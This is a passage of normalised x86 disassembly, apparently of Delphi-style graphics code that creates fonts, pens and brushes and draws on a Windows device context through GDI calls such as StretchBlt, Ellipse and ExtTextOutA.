mov [ fs : eax ] edx
push sub_42364c
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403fc8
retn
mov eax [ rw-data ]
call sub_422800
xor eax eax
push ebp
push sub_42361d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42280c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404208
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408c78
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404208
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408c78
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404208
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408298
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_4237a0
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_423664
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423220
mov edx esp
mov eax ebx
call sub_423458
add esp 0x2c
pop esi
pop ebx
retn
sub_423690
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423440
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423458
add esp 0x2c
pop esi
pop ebx
retn
sub_4236d0
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423440
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c68
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404240
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b58
mov edx esp
mov eax ebx
call sub_423458
sub_423748
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call sub_40651c
mov edx eax
neg edx
mov eax ebx
call sub_423690
pop esi
pop ebx
retn
sub_423774
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423440
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423458
add esp 0x30
pop ebx
retn
sub_4237a8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423440
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_423458
add esp 0x2c
pop esi
pop ebx
retn
sub_4237d8
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423440
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_423458
add esp 0x2c
pop esi
pop ebx
retn
sub_423800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422818
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_423844
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4228fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_42386c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41abc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_42390b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42302c
xor eax eax
push ebp
push sub_4238ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422a24
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_423a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238f5
mov eax [ ebp - 0x8 ]
call sub_42303c
retn
sub_423924
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_42393c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_423981
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4229ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423988
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_423994
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423924
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_42393c
add esp 0x10
pop esi
pop ebx
retn
sub_4239bc
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422800
xor eax eax
push ebp
push sub_423a42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42280c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_422fe8
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_423a54
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] edx
mov edx esp
call sub_42393c
add esp 0x10
pop edi
pop esi
retn
sub_423a90
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423924
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_42393c
add esp 0x10
pop esi
pop ebx
retn
sub_423ac0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423924
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_42393c
sub_423aec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_422818
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_423b2c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4228fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_423b54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41abc8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_423be4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_42302c
xor eax eax
push ebp
push sub_423bc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423bce
mov eax [ ebp - 0x8 ]
call sub_42303c
retn
sub_423bfc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_423c18
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42302c
xor eax eax
push ebp
push sub_423c5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4229ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c64
mov eax [ ebp - 0x4 ]
call sub_42303c
retn
sub_423c68
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_423c18
add esp 0x10
pop edi
pop esi
retn
sub_423c94
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423bfc
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_423c18
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_423cc8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_422800
xor edx edx
push ebp
push sub_423d95
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42280c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_422fe8
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_423db0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423bfc
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_423c18
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_423de4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232d4
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4247e0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423800
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424800
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_424820
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41a8f0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_423ea8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41a98c
xor edx edx
mov eax esi
call sub_424618
mov eax [ esi + 0xc ]
call sub_403254
mov eax [ esi + 0x10 ]
call sub_403254
mov eax [ esi + 0x14 ]
call sub_403254
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_423f04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42466c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_423f8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebx + 0x14 ]
call sub_423c8c
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41919c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424038
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42406c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Ellipse
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4240b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebx + 0x14 ]
call sub_423cc8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4240f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebx + 0x14 ]
call sub_423cc8
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42412c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42418c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4241b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4241f0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424238
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call RoundRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_424288
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4242c4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_424598
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4242f0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov edi [ ebx + 0x54 ]
or edi 0x4
mov eax [ ebx + 0x14 ]
call sub_423da8
cmp al 0x1
je r-xdata
test [ ebx + 0x54 ] 0x80
je r-xdata
or edi 0x2
push 0x0
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_4242c4
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4243d4
inc eax
add [ ebp - 0x4 ] eax
sub_424390
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_404264
push eax
mov eax edi
call sub_404464
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4243d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424390
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4243f0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424390
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424410
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42445c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424463
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_424164
sub_4244bc
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4244e0
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_42418c
pop ecx
pop edx
pop edi
pop esi
retn
sub_424500
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_42452c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
mov eax [ ebp + 0x8 ]
call sub_422fe8
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424574
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_42466c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_4245b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424618
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4245b8
mov edx esp
mov eax ebx
call sub_4244bc
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4244e0
sub_42466c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424708
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
test bl 0x8
je r-xdata
mov eax esi
call sub_424734
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424764
sub_424708
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4234bc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424734
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4239bc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
